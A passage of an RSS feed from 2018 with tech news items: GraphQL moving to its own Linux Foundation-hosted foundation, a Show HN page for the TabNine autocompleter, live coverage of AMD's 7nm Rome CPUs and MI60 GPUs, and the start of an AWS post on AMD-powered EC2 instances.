&lt;p&gt;Facebook announced GraphQL back in 2012 and open sourced it in 2015. Today, it’s being used by companies that range from &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/airbnb&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;airbnb&quot;&gt;Airbnb&lt;/a&gt; to &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/audi&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;audi&quot;&gt;Audi,&lt;/a&gt; GitHub, Netflix, Shopify, Twitter and &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/newyorktimes&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;newyorktimes&quot;&gt;The New York Times&lt;/a&gt;. At Facebook itself, the GraphQL API powers billions of API calls every day. At its core, GraphQL is basically a language for querying databases from client-side applications and a set of specifications for how the API on the backend should present this data to the client. It presents an alternative to REST-based APIs and promises to offer developers more flexibility and the ability to write faster and more secure applications. Virtually every major programming language now supports it through a variety of libraries.&lt;/p&gt;
&lt;p&gt;“GraphQL has redefined how developers work with APIs and client-server interactions. We look forward to working with the GraphQL community to become an independent foundation, draft their governance and continue to foster the growth and adoption of GraphQL,” said Chris Aniszczyk, vice president of Developer Relations at the Linux Foundation.&lt;/p&gt;
&lt;p&gt;As Aniszczyk noted, the new foundation will have an open governance model, similar to that of other Linux Foundation projects. The exact details are still a work in progress, though. The list of founding members is also still in flux, but for now, it includes Airbnb, Apollo, &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/coursera&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;coursera&quot;&gt;Coursera,&lt;/a&gt; Elementl, Facebook, GitHub, Hasura, Prisma, Shopify and Twitter.&lt;/p&gt;
&lt;p&gt;“We are thrilled to welcome the GraphQL Foundation into the Linux Foundation,” said Jim Zemlin, the executive director of the Linux Foundation. “This advancement is important because it allows for long-term support and accelerated growth of this essential and groundbreaking technology that is changing the approach to API design for cloud-connected applications in any language.”&lt;/p&gt;
&lt;p&gt;For now, the founding members expect that the &lt;a href=&quot;https://github.com/facebook/graphql/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/facebook/graphql/&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNGyEg23-UYk7di1GfMZnTusFoqFoA&quot;&gt;GraphQL specification&lt;/a&gt;, &lt;a href=&quot;https://github.com/graphql/graphql-js&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/graphql/graphql-js&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNEooMZa8QV2gZFTrsa7qy8LJf0DlQ&quot;&gt;GraphQL.js&lt;/a&gt; &lt;wbr/&gt;reference implementation, &lt;a href=&quot;https://github.com/facebook/dataloader&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/facebook/dataloader&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNFYvWnBe3e8paWM7OJ_MlgGGi0U2w&quot;&gt;DataLoader&lt;/a&gt; &lt;wbr/&gt;library and &lt;a href=&quot;https://github.com/graphql/graphiql&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-saferedirecturl=&quot;https://www.google.com/url?q=https://github.com/graphql/graphiql&amp;amp;source=gmail&amp;amp;ust=1541541289826000&amp;amp;usg=AFQjCNE7baEBQtdRIjqjwOMSAVrZ18u6BA&quot;&gt;GraphiQL&lt;/a&gt; developer tool will become the core technical projects of the foundation, but that, too, could still change.&lt;/p&gt;
&lt;p&gt;At this point, the Linux Foundation is essentially a foundation for foundations. It provides support for dozens of projects now, with Linux itself being just one of those. Those other foundations include the likes of the Cloud Native Computing Foundation (the home of &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/kubernetes&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;kubernetes&quot;&gt;Kubernetes),&lt;/a&gt; the Cloud Foundry Foundation, Automotive Grade Linux, the JS Foundation (which is about to &lt;a href=&quot;https://www.linuxfoundation.org/news/2018/10/node-js-foundation-and-js-foundation-announce-intent-to-create-joint-organization-to-support-the-broad-node-js-and-javascript-communities/&quot;&gt;merge&lt;/a&gt; with the Node.js Foundation) and more.&lt;/p&gt;
&lt;p&gt;As more large companies release open-source projects, those projects that become popular often get to the point where having a single company govern the project’s life cycle is neither feasible nor in the best interest of the community. &lt;a href=&quot;https://www.spinnaker.io/&quot;&gt;Spinnaker&lt;/a&gt;, the continuous delivery platform backed by Netflix and Google, recently &lt;a href=&quot;https://techcrunch.com/2018/10/09/spinnaker-is-the-next-big-open-source-project-to-watch/&quot;&gt;reached this point&lt;/a&gt;, for example. Surely, GraphQL is also now at this point, where it’s stable and has wide adoption but could benefit from being separated from the mothership and get its own vendor-neutral foundation.&lt;/p&gt;
</description>
<pubDate>Tue, 06 Nov 2018 21:12:21 +0000</pubDate>
<dc:creator>bodecker</dc:creator>
<og:title>Facebook’s GraphQL gets its own open-source foundation</og:title>
<og:description>GraphQL, the Facebook -incubated data query language, is moving into its own open-source foundation. Like so many other similar open-source foundations, the aptly named GraphQL Foundation will be hosted by the Linux Foundation. Facebook announced GraphQL back in 2012 and open sourced it in 2015. To…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2018/11/2018-11-06_0824.png?w=618</og:image>
<og:url>http://social.techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2018/11/06/facebooks-graphql-gets-its-own-open-source-foundation/</dc:identifier>
</item>
<item>
<title>Show HN: TabNine, an autocompleter for all languages</title>
<link>https://tabnine.com/</link>
<guid isPermaLink="true" >https://tabnine.com/</guid>
<description>&lt;p&gt;TabNine is the all-language autocompleter. It uses machine learning to provide responsive, reliable, and relevant suggestions.&lt;/p&gt;
&lt;p&gt;Traditional autocompleters suggest one word at a time.&lt;/p&gt;
&lt;p&gt;Why accept this limitation?&lt;/p&gt;

&lt;table readability=&quot;3&quot;&gt;&lt;tr&gt;&lt;th&gt;Feature&lt;/th&gt;
&lt;th&gt;Premium&lt;/th&gt;
&lt;th&gt;Free&lt;/th&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Whole project indexing&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;.gitignore awareness&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Fuzzy matching&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;No configuration necessary&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;~20 millisecond response time&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;Context-aware suggestions&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Vim support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Sublime Text support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;VS Code support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Atom support&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Up to 200 KB indexed&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Up to 15 MB indexed&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td/&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;All versions of TabNine still work with projects larger than the indexing limit. Files will be added and removed from the index to ensure that the indexed files are as relevant as possible to the files you are editing.&lt;/p&gt;
&lt;p&gt;TabNine offers a 30-day money back guarantee (&lt;a href=&quot;https://tabnine.com/contact&quot;&gt;contact info&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://tabnine.com/install&quot;&gt;Install TabNine here.&lt;/a&gt;&lt;/strong&gt; TabNine is easy to install and no configuration is necessary.&lt;/p&gt;
&lt;p&gt;If TabNine does not work as soon as you install it, this is a bug and you &lt;a href=&quot;https://github.com/zxqfl/tabnine-vim/issues&quot;&gt;should&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-sublime/issues&quot;&gt;file&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-atom/issues&quot;&gt;an&lt;/a&gt; &lt;a href=&quot;https://github.com/zxqfl/tabnine-vscode/issues&quot;&gt;issue&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;How does it work?&lt;/h2&gt;
&lt;p&gt;TabNine builds an index of your project, reading your .gitignore so that only source files are included. It uses this index to provide useful information to a softmax regression model which ranks candidate completions. For example, TabNine knows how often each pair of consecutive symbols appears in your project, so it knows that &lt;code&gt;static void&lt;/code&gt; is more common than &lt;code&gt;void static&lt;/code&gt; (although they are the same to a C++ compiler).&lt;/p&gt;
&lt;p&gt;The candidate completions are then given to a secondary completion engine, which may suggest additional characters for completion, based on similar patterns found elsewhere in your project. This diagram illustrates the role of this completion engine:&lt;/p&gt;
&lt;div class=&quot;diagram&quot;&gt;&lt;img src=&quot;https://tabnine.com/graph1.png&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Another abstraction layer parameterizes the patterns by the identifiers they contain, allowing TabNine to provide suggestions involving words that it has only seen once, such as &lt;code&gt;String&lt;/code&gt; in this example:&lt;/p&gt;
&lt;div class=&quot;gallery-image&quot;&gt;&lt;img src=&quot;https://tabnine.com/gallery8.png&quot;/&gt;&lt;/div&gt;
&lt;p&gt;Here is a diagram illustrating this process:&lt;/p&gt;
&lt;div class=&quot;diagram&quot;&gt;&lt;img src=&quot;https://tabnine.com/graph2.png&quot;/&gt;&lt;/div&gt;
&lt;h2 id=&quot;instructions&quot;&gt;Installation&lt;/h2&gt;

&lt;h2&gt;Buy a license&lt;/h2&gt;
&lt;p&gt;TabNine costs $29. It is currently in beta. When it is released, your software will automatically update to the full released version at no additional charge.&lt;/p&gt;
&lt;p&gt;TabNine will save you at least 1 second per minute. If you value your time above $0.83/hour, it will pay for itself in less than a year. (Assuming 2087 hours in a work year.)&lt;/p&gt;

</description>
<pubDate>Tue, 06 Nov 2018 18:06:19 +0000</pubDate>
<dc:creator>jacob-jackson</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://tabnine.com/</dc:identifier>
</item>
<item>
<title>AMD Announces 7nm Rome CPUs and MI60 GPUs</title>
<link>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</link>
<guid isPermaLink="true" >https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</guid>
<description>&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/img-7243-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1MvODA5MjcyL29yaWdpbmFsL0lNR183MjQzLkpQRw==&quot; big-src=&quot;https://img.purch.com/img-7243-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1MvODA5MjcyL29yaWdpbmFsL0lNR183MjQzLkpQRw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;We're here at AMD's Next Horizon Event to bring you up to the minute news on the company's 7nm products. This is breaking news, so check back frequently or refresh the page for updates.&lt;/p&gt;
&lt;p&gt;AMD is expected to make major announcements about its new 7nm CPUs and GPUs. Intel continues to struggle with its 10nm manufacturing process, which is delayed until late 2019. If AMD can field 7nm processors early this year, it will mark the first time in the company's history that it has had a process node leadership position over Intel. That should equate to faster, denser, and less power-hungry processors than Intel's 14nm chips.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-090308-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL08vODA5MTk2L29yaWdpbmFsLzIwMTgxMTA2XzA5MDMwOC5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-090308-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL08vODA5MTk2L29yaWdpbmFsLzIwMTgxMTA2XzA5MDMwOC5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;AMD CEO Lisa Su is delivering the opening statements. She recounted the path of the EPYC data center processors to market and discussed many of the key roles those processors are used for, such as workloads in HPC, cloud, hyperscale, and virtualization environments. AMD sees the data center as a $29 billion opportunity by 2021, and GPUs are playing a larger role as the industry shifts to artificial intelligence and machine learning workloads. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-091702-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1AvODA5MTk3L29yaWdpbmFsLzIwMTgxMTA2XzA5MTcwMi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-091702-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1AvODA5MTk3L29yaWdpbmFsLzIwMTgxMTA2XzA5MTcwMi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Amazon Web Services, one of the world's largest cloud service providers, announced that, beginning today, it is offering new EPYC-powered cloud instances. The R5a, M5a and T3a instances purportedly will offer a 10% price-to-performance advantage over AWS's other cloud instances.&lt;/p&gt;

&lt;p&gt;Mark Papermaster will cover the new Zen 2 cores and AMD's 7nm process technology. AMD will also reveal more about the 7nm Mi60 Instinct GPU for the data center. AMD will also provide early specifications for AMD's Rome, the first x86 7nm processor for the data center. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-092626-jpg/w/711/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1MvODA5MjAwL29yaWdpbmFsLzIwMTgxMTA2XzA5MjYyNi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-092626-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9EL1MvODA5MjAwL29yaWdpbmFsLzIwMTgxMTA2XzA5MjYyNi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD is already sampling its 7nm Rome processors, which mark the debut of the Zen 2 microarchitecture, to customers. The firm also has its Zen 3 processors under development. This third-gen microarchitecture will debut on the 7nm+ process, with the &quot;+&quot; indicating this will be a second generation of the 7nm node (a &quot;tock&quot; equivalent). &lt;/p&gt;

&lt;p&gt;The new processors feature faster, smaller, and lower-power transistors. As with all new nodes, development requires a significant investment from both AMD and TSMC, which will fab the parts. The high up-front costs associated with developing a new node pushed AMD's primary manufacturing partner, Global Foundries, out of the 7nm race earlier this year. AMD remains committed to delivering the new node and using it as a vehicle to deliver the new Zen 2 microarchitecture to market.&lt;/p&gt;
&lt;p&gt;AMD also announced that it is already working on the Zen 4 microarchitecture, but didn't reveal significant details.&lt;/p&gt;

&lt;p&gt;Zen 2 will provide up to 2X the compute power per node, improved execution pipeline, doubled core density, and use half the energy per operation. AMD has doubled floating point performance with the Zen 2 microarchitecture.&lt;/p&gt;

&lt;p&gt;AMD has improved the branch predictor, pre-fetching engine, and doubled the load/store bandwidth. AMD also doubled the vector width to 256-bit. We'll follow up with deeper analysis. This type of technical data isn't well suited for live public disclosure. &lt;/p&gt;

&lt;p&gt;AMD has improved the Infinity Fabric. AMD is now using the second-gen Infinity Fabric to connect a multi-chip design with a 14nm I/O die serving as the linchpin of the design. That central chip ties together the 7nm CPU chiplets, creating a massively scalable architecture. We'll follow up with deeper analysis of this design. Note that the DDR4 controllers are all attached to the central I/O chip. That will result in higher memory latency to all connected controllers, but memory latency will be consistent for all compute chiplets (assuming perfectly linear data delivery across the fabric). That should be a major step forward for AMD to address concerns about performance variability.&lt;/p&gt;

&lt;p&gt;David Wang displayed the world's first 7nm GPU. The die wields 13.28B transistors and measures just 331mm&lt;sup&gt;2&lt;/sup&gt;. The GPU is based on the advanced Vega architecture and is the first PCIe 4.0 GPU on the market. It also is the first to use the Infinity Fabric over the external PCIe bus and the first GPU to have 1TB/s of memory bandwidth. The MI60 offers up to 7.4 TFLOPS of FP64 and 14.7 TFLOPS of FP32.&lt;/p&gt;

&lt;p&gt;AMD also presented performance benchmarks highlighting the generational performance gains relative to 12nm GPUs. It also presented scalability benchmarks to highlight gains due to the increased PCIe 4.0 bandwidth. The company also provided direct comparisons to Nvidia's V100 GPUs. These results are, of course, vendor-provided, so we'll have to dive deeper into the conditions of the benchmarks.  &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-102355-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GLzkvODA5MjUzL29yaWdpbmFsLzIwMTgxMTA2XzEwMjM1NS5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-102355-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GLzkvODA5MjUzL29yaWdpbmFsLzIwMTgxMTA2XzEwMjM1NS5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD presented its new GPU roadmap. Shipping MI60 this quarter. &quot;MI-Next&quot; is in development, but with no firm date given for delivery.&lt;/p&gt;

&lt;p&gt;The 7nm Rome CPUs come with 64 physical Zen 2 cores, which equates to 128 threads per processor, double that of the first-gen Naples chips. In a two socket server, that equates to 128 physical cores and 256 threads in a single box. Rome is also the first PCIe 4.0 CPU, which offers double the bandwidth per channel. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/20181106-112322-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL08vODA5MjY4L29yaWdpbmFsLzIwMTgxMTA2XzExMjMyMi5qcGc=&quot; big-src=&quot;https://img.purch.com/20181106-112322-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL08vODA5MjY4L29yaWdpbmFsLzIwMTgxMTA2XzExMjMyMi5qcGc=&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD has also made the processors backward compatible with its existing server ecosystem. These drop-in replacements offer twice the performance of the previous generation per socket. You also get four times the floating point performance per chip.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/-582e55b65e9d6a001e8f5652ca477a00c23d86a6be242a50ca-pimgpsh-fullsize-distr-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL04vODA5MjY3L29yaWdpbmFsLy01ODJFNTVCNjVFOUQ2QTAwMUU4RjU2NTJDQTQ3N0EwMEMyM0Q4NkE2QkUyNDJBNTBDQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; big-src=&quot;https://img.purch.com/-582e55b65e9d6a001e8f5652ca477a00c23d86a6be242a50ca-pimgpsh-fullsize-distr-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL04vODA5MjY3L29yaWdpbmFsLy01ODJFNTVCNjVFOUQ2QTAwMUU4RjU2NTJDQTQ3N0EwMEMyM0Q4NkE2QkUyNDJBNTBDQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;There are eight 7nm eight-core die tied to a central 14nm I/O die. &lt;span class=&quot;imgContent imgCenter&quot;&gt;&lt;span class=&quot;imgWrapperOutter&quot;&gt;&lt;span class=&quot;imgWrapperInner&quot;&gt;&lt;span class=&quot;iZoom&quot;&gt;&lt;img class=&quot;lazy&quot; data-src=&quot;https://img.purch.com/-16d682cbcbac77a99a1276961cb0ed9af44ea7a8a1b9fac20a-pimgpsh-fullsize-distr-jpg/w/755/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1QvODA5MjczL29yaWdpbmFsLy0xNkQ2ODJDQkNCQUM3N0E5OUExMjc2OTYxQ0IwRUQ5QUY0NEVBN0E4QTFCOUZBQzIwQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; big-src=&quot;https://img.purch.com/-16d682cbcbac77a99a1276961cb0ed9af44ea7a8a1b9fac20a-pimgpsh-fullsize-distr-jpg/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1QvODA5MjczL29yaWdpbmFsLy0xNkQ2ODJDQkNCQUM3N0E5OUExMjc2OTYxQ0IwRUQ5QUY0NEVBN0E4QTFCOUZBQzIwQS1waW1ncHNoX2Z1bGxzaXplX2Rpc3RyLmpwZw==&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;AMD also displayed a demo with the 7nm Rome CPUs and the 7nm GPU MI60 CPUs together. AMD also displayed a single Rome processor beating two of Intel's flagship 8180 CPUs in a rendering benchmark.&lt;/p&gt;
</description>
<pubDate>Tue, 06 Nov 2018 18:03:33 +0000</pubDate>
<dc:creator>ccwilson10</dc:creator>
<og:url>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</og:url>
<og:title>AMD Announces 64-Core 7nm Rome CPUs, 7nm MI60 GPUs, And Zen 4</og:title>
<og:description>We're here at AMD's New Horizon Event to bring you up to the minute news on the company's 7nm products.</og:description>
<og:image>https://img.purch.com/o/aHR0cDovL21lZGlhLmJlc3RvZm1pY3JvLmNvbS9GL1IvODA5MjcxL29yaWdpbmFsL0lNR183MjMxLkpQRw==</og:image>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.tomshardware.com/news/amd-new-horizon-7nm-cpu,38029.html</dc:identifier>
</item>
<item>
<title>New Lower-Cost, AMD-Powered M5a and R5a EC2 Instances</title>
<link>https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</link>
<guid isPermaLink="true" >https://aws.amazon.com/blogs/aws/new-lower-cost-amd-powered-ec2-instances/</guid>
<description>&lt;table id=&quot;amazon-polly-audio-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td id=&quot;amazon-polly-audio-tab&quot;&gt;


&lt;div id=&quot;amazon-polly-by-tab&quot;&gt;&lt;a href=&quot;https://aws.amazon.com/polly/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img src=&quot;https://a0.awsstatic.com/aws-blog/images/Voiced_by_Amazon_Polly_EN.png&quot; width=&quot;554&quot; height=&quot;56&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;From the start, AWS has focused on choice and economy. Driven by a never-ending torrent of customer requests that power our well-known Virtuous Cycle, I think we have delivered on both over the years:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;https://media.amazonwebservices.com/blog/2018/virtuous_cycle_2.png&quot; width=&quot;375&quot; height=&quot;271&quot;/&gt;&lt;strong&gt;Choice&lt;/strong&gt; – AWS gives you choices in a wide range of dimensions including locations (18 operational geographic &lt;a href=&quot;https://aws.amazon.com/about-aws/global-infrastructure/&quot;&gt;regions&lt;/a&gt;, 4 more in the works, and 1 local region), compute models (&lt;a href=&quot;https://aws.amazon.com/ec2/&quot;&gt;instances&lt;/a&gt;, &lt;a href=&quot;https://aws.amazon.com/what-are-containers/&quot;&gt;containers&lt;/a&gt;, and &lt;a href=&quot;https://aws.amazon.com/serverless/&quot;&gt;serverless&lt;/a&gt;), &lt;a href=&quot;https://aws.amazon.com/ec2/instance-types/&quot;&gt;EC2 instance types&lt;/a&gt;, &lt;a href=&quot;https://aws.amazon.com/rds/&quot;&gt;relational&lt;/a&gt; and &lt;a href=&quot;https://aws.amazon.com/nosql/&quot;&gt;NoSQL&lt;/a&gt; database choices, &lt;a href=&quot;https://aws.amazon.com/developer/&quot;&gt;development languages&lt;/a&gt;, and pricing/purchase models.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Economy&lt;/strong&gt; – We have &lt;a href=&quot;https://aws.amazon.com/blogs/aws/category/price-reduction/&quot;&gt;reduced prices&lt;/a&gt; 67 times so far, and work non-stop to drive down costs and to make AWS an increasingly better value over time. We study usage patterns, identify areas for innovation and improvement, and deploy updates across the entire AWS Cloud on a very regular and frequent basis.&lt;/p&gt;
&lt;p&gt;Today I would like to tell you about our latest development, one that provides you with a choice of EC2 instances that are more economical than ever!&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Powered by AMD&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;The newest EC2 instances are powered by custom AMD EPYC processors running at 2.5 GHz and are priced 10% lower than comparable instances. They are designed to be used for workloads that don’t use all of compute power available to them, and provide you with a new opportunity to optimize your instance mix based on cost and performance.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://media.amazonwebservices.com/blog/2018/m5a_r5a_1.png&quot;/&gt;Here’s what we are launching:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;General Purpose&lt;/strong&gt; – M5a instances are designed for general purpose workloads: web servers, app servers, dev/test environments, and gaming. The M5a instances are available in 6 sizes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Memory Optimized&lt;/strong&gt; – R5a instances are designed for memory-intensive workloads: data mining, in-memory analytics, caching, and so forth. The R5a instances are available in 6 sizes, with lower per-GiB memory pricing in comparison to the R5 instances.&lt;/p&gt;
&lt;p&gt;The new instances are built on the AWS Nitro System. They can make use of existing HVM AMIs (as is the case with all other recent EC2 instance types, the AMI must include the ENA and NVMe drivers), and can be used in &lt;a href=&quot;https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/placement-groups.html&quot;&gt;Cluster Placement Groups&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These new instances should be a great fit for customers who are looking to further cost-optimize their Amazon EC2 compute environment. As always, we recommend that you measure performance and cost on your own workloads when choosing your instance types.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;General Purpose Instances&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Here are the specs for the M5a instances:&lt;/p&gt;
